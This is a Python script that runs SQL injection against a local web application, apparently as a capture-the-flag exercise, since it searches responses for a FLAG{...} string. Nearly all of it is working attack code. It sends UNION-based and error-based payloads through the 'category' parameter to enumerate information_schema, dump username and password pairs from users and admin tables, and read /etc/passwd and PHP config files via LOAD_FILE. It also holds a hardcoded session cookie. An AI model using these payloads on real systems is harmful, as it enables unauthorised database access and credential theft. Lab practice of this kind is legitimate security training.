import requests
import urllib.parse
import time
import re

# Target setup
target = "http://127.0.0.1:32780/"
session_cookie = "PHPSESSID=a619c2d322b0d2025997d9751eb6d09a"
headers = {"Cookie": session_cookie}

print("=" * 80)
print("SQL INJECTION DATA EXTRACTION")
print("=" * 80)

def send_payload(payload, description):
    print(f"\n[+] {description}")
    url_encoded = urllib.parse.quote(payload, safe='')
    url = f"{target}?category={url_encoded}"
    
    try:
        response = requests.get(url, headers=headers, timeout=15)
        
        # Look for flag
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!!!] FLAG FOUND: {flag_match.group()}")
            print("\n" + "=" * 80)
            print("FULL RESPONSE:")
            print("=" * 80)
            print(response.text)
            exit()
        
        # Extract data between HTML tags and interesting strings
        content_matches = re.findall(r'>([^<]{5,100})<', response.text)
        interesting_data = []
        
        for match in content_matches:
            # Skip common HTML/PHP noise
            if any(skip in match.lower() for skip in ['notice', 'undefined', 'variable', 'html', 'php', 'br /']):
                continue
            if len(match.strip()) > 4:
                interesting_data.append(match.strip())
        
        if interesting_data:
            # Remove duplicates while preserving order
            seen = set()
            unique_data = []
            for item in interesting_data:
                if item not in seen:
                    seen.add(item)
                    unique_data.append(item)
            
            print(f"[!] Extracted data: {unique_data[:10]}")  # Show first 10
            return {'data': unique_data, 'text': response.text}
        
        return {'text': response.text}
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return {'error': str(e)}

# Test 1: Direct UNION with information_schema
print("\n" + "=" * 80)
print("TEST 1: Extract table names from information_schema.tables")
print("=" * 80)

for i in range(0, 5):
    payload = f"' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {i}-- "
    send_payload(payload, f"Table {i+1}")
    time.sleep(0.3)

# Test 2: Extract columns from likely tables
print("\n" + "=" * 80)
print("TEST 2: Extract columns from common sensitive tables")
print("=" * 80)

likely_tables = ['users', 'admin', 'posts', 'categories', 'articles', 'blog']
for table in likely_tables:
    print(f"\n[+] Checking table: {table}")
    for i in range(0, 3):
        payload = f"' UNION SELECT column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='{table}' LIMIT 1 OFFSET {i}-- "
        result = send_payload(payload, f"Column {i+1} from {table}")
        if result.get('data'):
            print(f"    Found: {result['data']}")
        time.sleep(0.2)

# Test 3: Try to dump data from tables we might have found
print("\n" + "=" * 80)
print("TEST 3: Dump data from potential tables")
print("=" * 80)

data_payloads = [
    # Try different column counts with NULL padding
    "' UNION SELECT GROUP_CONCAT(table_name),2,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- ",
    "' UNION SELECT GROUP_CONCAT(column_name),2,3,4,5 FROM information_schema.columns WHERE table_schema=database()-- ",
    "' UNION SELECT CONCAT(id,':',name),2,3,4,5 FROM users LIMIT 5-- ",
    "' UNION SELECT CONCAT(username,':',password),2,3,4,5 FROM users LIMIT 5-- ",
    "' UNION SELECT CONCAT(admin_user,':',admin_pass),2,3,4,5 FROM admin LIMIT 5-- ",
    "' UNION SELECT flag,2,3,4,5 FROM flag LIMIT 5-- ",
    "' UNION SELECT content,2,3,4,5 FROM posts LIMIT 5-- ",
]

for i, payload in enumerate(data_payloads):
    result = send_payload(payload, f"Dump attempt {i+1}")
    time.sleep(0.3)
    
    if 'flag' in result.get('data', []):
        break

# Test 4: Error-based extraction
print("\n" + "=" * 80)
print("TEST 4: Error-based data extraction")
print("=" * 80)

error_payloads = [
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flag LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)-- ",
]

for payload in error_payloads:
    send_payload(payload, "Error-based extraction")
    time.sleep(0.3)

# Test 5: Try different UNION positions - maybe data appears in different field
print("\n" + "=" * 80)
print("TEST 5: Testing different UNION column positions")
print("=" * 80)

# Try putting our extraction in each position
for pos in range(1, 6):
    nulls = []
    for i in range(1, 6):
        if i == pos:
            nulls.append("(SELECT flag FROM flag LIMIT 1)")
        else:
            nulls.append("NULL")
    
    payload = f"' UNION SELECT {','.join(nulls)}-- "
    result = send_payload(payload, f"Extract in position {pos}")
    time.sleep(0.3)

# Test 6: Try to read files if MySQL has FILE privileges
print("\n" + "=" * 80)
print("TEST 6: Attempting file read (if FILE privilege available)")
print("=" * 80)

file_payloads = [
    "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL,NULL,NULL-- ",
    "' UNION SELECT LOAD_FILE('/var/www/html/index.php'),NULL,NULL,NULL,NULL-- ",
    "' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL,NULL,NULL-- ",
]

for payload in file_payloads:
    send_payload(payload, "File read attempt")
    time.sleep(0.3)

print("\n" + "=" * 80)
print("EXTRACTION ATTEMPTS COMPLETE")
print("=" * 80)
print("Check above output for flags, credentials, or table data.")
